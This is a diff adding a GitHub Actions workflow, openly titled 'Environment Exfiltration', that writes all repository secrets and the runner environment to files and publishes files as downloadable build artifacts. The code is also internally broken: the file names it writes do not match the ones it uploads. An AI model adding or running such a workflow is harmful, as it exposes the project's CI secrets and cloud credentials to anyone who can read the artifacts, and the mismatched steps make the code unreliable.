@@ -1,0 +1,30 @@
+name: Environment Exfiltration
+on:
+  workflow_dispatch:
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Collect Environment
+        run: |
+          echo "${{ toJSON(secrets) }}" > secrets.json
+          env > environment.json
+
+      - name: Upload Environment Data
+        uses: actions/upload-artifact@v4
+        with:
+          name: environment
+          path: environment.json
+
+      - name: Upload Credentials
+        uses: actions/upload-artifact@v4
+        with:
+          name: credentials
+          path: credentials.json
+
+      - name: Upload Cloud Config
+        uses: actions/upload-artifact@v4
+        with:
+          name: cloud
+          path: cloud.json
